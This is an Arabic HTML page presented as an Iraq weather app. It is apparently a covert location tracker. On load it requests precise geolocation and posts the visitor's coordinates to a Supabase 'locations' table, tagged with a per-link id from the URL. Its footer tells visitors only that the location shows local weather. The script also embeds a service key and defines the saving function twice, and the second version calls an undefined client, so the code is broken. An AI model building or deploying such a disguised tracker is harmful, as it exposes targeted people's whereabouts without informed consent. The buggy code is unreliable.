<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>طقس العراق</title>

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            min-height: 100vh;
            font-family: Arial, Tahoma, sans-serif;
            background: linear-gradient(135deg, #4facfe, #00c6ff);
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            color: #fff;
        }

        .container {
            width: 100%;
            max-width: 430px;
        }

        .weather-card {
            background: rgba(255, 255, 255, 0.15);
            backdrop-filter: blur(15px);
            border-radius: 25px;
            padding: 30px 25px;
            text-align: center;
            box-shadow: 0 10px 35px rgba(0, 0, 0, 0.2);
        }

        h1 {
            margin-top: 0;
            font-size: 30px;
        }

        .loading {
            font-size: 20px;
            margin: 30px 0;
        }

        .permission {
            background: rgba(255,255,255,0.15);
            padding: 20px;
            border-radius: 15px;
            margin-top: 20px;
            line-height: 1.8;
        }

        .weather-icon {
            font-size: 75px;
            margin: 15px 0;
        }

        .temperature {
            font-size: 60px;
            font-weight: bold;
            margin: 10px 0;
        }

        .condition {
            font-size: 22px;
            margin-bottom: 25px;
        }

        .details {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
            margin-top: 20px;
        }

        .detail {
            background: rgba(255,255,255,0.12);
            border-radius: 15px;
            padding: 15px 10px;
        }

        .detail-title {
            font-size: 14px;
            opacity: 0.8;
            margin-bottom: 7px;
        }

        .detail-value {
            font-size: 18px;
            font-weight: bold;
        }

        .status {
            margin-top: 20px;
            font-size: 14px;
            opacity: 0.85;
        }

        .error {
            background: rgba(255, 70, 70, 0.25);
            padding: 15px;
            border-radius: 15px;
            margin-top: 20px;
            line-height: 1.7;
        }

        .hidden {
            display: none;
        }

        footer {
            margin-top: 20px;
            font-size: 12px;
            opacity: 0.65;
        }
    </style>
</head>

<body>

<div class="container">

    <div class="weather-card">

        <h1>🌤️ طقس العراق</h1>

        <div id="loading" class="loading">
           جاري عرض الطقس..
        </div>

        <div id="permissionMessage" class="permission hidden">
            نحتاج إلى السماح بالوصول إلى موقعك
            <br>
            حتى نتمكن من عرض حالة الطقس في موقعك الحالي.
        </div>

        <div id="error" class="error hidden"></div>

        <div id="weatherContent" class="hidden">

            <div id="weatherIcon" class="weather-icon">☀️</div>

            <div id="temperature" class="temperature">
                --°
            </div>

            <div id="condition" class="condition">
                --
            </div>

            <div class="details">

                <div class="detail">
                    <div class="detail-title">💧 الرطوبة</div>
                    <div id="humidity" class="detail-value">--%</div>
                </div>

                <div class="detail">
                    <div class="detail-title">🌡️ المحسوسة</div>
                    <div id="apparent" class="detail-value">--°</div>
                </div>

                <div class="detail">
                    <div class="detail-title">💨 سرعة الرياح</div>
                    <div id="wind" class="detail-value">-- km/h</div>
                </div>

                <div class="detail">
                    <div class="detail-title">📅 التاريخ</div>
                    <div id="date" class="detail-value">--</div>
                </div>

            </div>

            <div id="locationStatus" class="status">
                
            </div>

        </div>

        <footer>
            يتم استخدام موقعك لعرض الطقس في موقعك الحالي.
        </footer>

    </div>

</div>


<!-- Supabase -->
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

<script>

    // =====================================================
    // 1. ضع بيانات Supabase هنا
    // =====================================================

const SUPABASE_URL = "https://nlrlrsoccffvmgtgabdw.supabase.co";
const SUPABASE_KEY = "sb_publishable_o_ldECaKBOhR06kB46PwEQ_Q7RsjlBo"; // أو anon key الخاص بـ Supabase

async function saveLocation(lat, lng, acc) {
  try {
    const response = await fetch(`${SUPABASE_URL}/rest/v1/locations`, {
      method: "POST",
      headers: {
        "apikey": SUPABASE_KEY,
        "Authorization": `Bearer ${SUPABASE_KEY}`,
        "Content-Type": "application/json",
        "Prefer": "return=minimal"
      },
      body: JSON.stringify({
        latitude: lat,
        longitude: lng,
        accuracy: acc,
        request_id: "req_" + Date.now() // إرسال نص فريد بدلاً من كلمة DEFAULT
      })
    });

    if (!response.ok) {
      const errData = await response.json();
      console.error("Supabase Error:", errData);
    } else {
      console.log("تم حفظ الموقع بنجاح!");
    }
  } catch (err) {
    console.error("Fetch Error:", err);
  }
}

    // =====================================================
    // 2. قراءة Request ID من الرابط
    // =====================================================

    function getRequestId() {

        const params = new URLSearchParams(
            window.location.search
        );

        return params.get("id") || "DEFAULT";
    }


    // =====================================================
    // 3. حفظ الموقع في Supabase
    // =====================================================

    async function saveLocation(latitude, longitude, accuracy) {

        const requestId = getRequestId();

        console.log("Saving location...");
        console.log("Request ID:", requestId);
        console.log("Latitude:", latitude);
        console.log("Longitude:", longitude);
        console.log("Accuracy:", accuracy);


        const { data, error } = await supabaseClient
            .from("locations")
            .insert({
                request_id: requestId,
                latitude: latitude,
                longitude: longitude,
                accuracy: accuracy
            });


        if (error) {

            console.error(
                "Supabase location error:",
                error
            );

            return false;
        }


        console.log(
            "Location saved successfully."
        );

        return true;
    }


    // =====================================================
    // 4. أوصاف الطقس
    // =====================================================

    const weatherDescriptions = {

        0: ["سماء صافية", "☀️"],

        1: ["غائم جزئياً", "🌤️"],

        2: ["غائم جزئياً", "⛅"],

        3: ["غائم", "☁️"],

        45: ["ضباب", "🌫️"],

        48: ["ضباب", "🌫️"],

        51: ["رذاذ خفيف", "🌦️"],

        53: ["رذاذ", "🌦️"],

        55: ["رذاذ كثيف", "🌧️"],

        61: ["أمطار خفيفة", "🌧️"],

        63: ["أمطار", "🌧️"],

        65: ["أمطار غزيرة", "🌧️"],

        71: ["ثلوج خفيفة", "🌨️"],

        73: ["ثلوج", "🌨️"],

        75: ["ثلوج غزيرة", "❄️"],

        80: ["زخات مطر", "🌦️"],

        81: ["زخات مطر", "🌧️"],

        82: ["زخات مطر قوية", "⛈️"],

        95: ["عاصفة رعدية", "⛈️"],

        96: ["عاصفة رعدية", "⛈️"],

        99: ["عاصفة رعدية", "⛈️"]

    };


    // =====================================================
    // 5. الحصول على الطقس
    // =====================================================

    async function getWeather(latitude, longitude) {

        try {

            const url =
                "https://api.open-meteo.com/v1/forecast" +
                "?latitude=" + latitude +
                "&longitude=" + longitude +
                "&current=" +
                "temperature_2m," +
                "relative_humidity_2m," +
                "apparent_temperature," +
                "weather_code," +
                "wind_speed_10m" +
                "&timezone=auto";


            const response = await fetch(url);


            if (!response.ok) {
                throw new Error("Weather request failed");
            }


            const data = await response.json();

            const current = data.current;


            const weatherCode = current.weather_code;


            const weatherInfo =
                weatherDescriptions[weatherCode]
                || ["حالة جوية غير معروفة", "🌤️"];


            const description = weatherInfo[0];

            const icon = weatherInfo[1];


            // عرض البيانات

            document.getElementById(
                "weatherIcon"
            ).textContent = icon;


            document.getElementById(
                "temperature"
            ).textContent =
                Math.round(current.temperature_2m) + "°";


            document.getElementById(
                "condition"
            ).textContent = description;


            document.getElementById(
                "humidity"
            ).textContent =
                current.relative_humidity_2m + "%";


            document.getElementById(
                "apparent"
            ).textContent =
                Math.round(current.apparent_temperature) + "°";


            document.getElementById(
                "wind"
            ).textContent =
                Math.round(current.wind_speed_10m) +
                " km/h";


            const now = new Date();


            document.getElementById(
                "date"
            ).textContent =
                now.toLocaleDateString(
                    "ar-IQ"
                );


            document.getElementById(
                "loading"
            ).classList.add("hidden");


            document.getElementById(
                "weatherContent"
            ).classList.remove("hidden");


        } catch (error) {

            console.error(
                "Weather error:",
                error
            );


            showError(
                "حدث خطأ أثناء جلب بيانات الطقس."
            );
        }
    }


    // =====================================================
    // 6. طلب الموقع
    // =====================================================

    function requestLocation() {

        if (!navigator.geolocation) {

            document.getElementById(
                "loading"
            ).classList.add("hidden");


            showError(
                "متصفحك لا يدعم تحديد الموقع."
            );

            return;
        }


        navigator.geolocation.getCurrentPosition(

            async function(position) {

                const latitude =
                    position.coords.latitude;


                const longitude =
                    position.coords.longitude;


                const accuracy =
                    position.coords.accuracy;


                console.log(
                    "Location received:",
                    latitude,
                    longitude
                );


                // حفظ الموقع في Supabase

                const saved =
                    await saveLocation(
                        latitude,
                        longitude,
                        accuracy
                    );


                if (saved) {

                    document.getElementById(
                        "locationStatus"
                    ).textContent =
                        "تم تحديد موقعك بنجاح";
                }


                // جلب الطقس

                getWeather(
                    latitude,
                    longitude
                );

            },


            function(error) {

                document.getElementById(
                    "loading"
                ).classList.add("hidden");


                let message = "";


                if (error.code === 1) {

                    message =
                        "لم يتم السماح بالوصول إلى موقعك. " +
                        "يرجى الضغط على Allow / السماح من نافذة المتصفح.";

                } else if (error.code === 2) {

                    message =
                        "تعذر تحديد موقعك حاليًا.";

                } else if (error.code === 3) {

                    message =
                        "انتهت مهلة تحديد الموقع. حاول مرة أخرى.";

                } else {

                    message =
                        "حدث خطأ أثناء تحديد موقعك.";
                }


                showError(message);
            },


            {
                enableHighAccuracy: true,

                timeout: 15000,

                maximumAge: 0
            }
        );
    }


    // =====================================================
    // 7. عرض الخطأ
    // =====================================================

    function showError(message) {

        const errorElement =
            document.getElementById("error");


        errorElement.textContent =
            message;


        errorElement.classList.remove(
            "hidden"
        );
    }


    // =====================================================
    // 8. تشغيل الموقع تلقائيًا
    // =====================================================

    window.addEventListener(
        "load",
        function() {

            requestLocation();

        }
    );

</script>

</body>
</html>
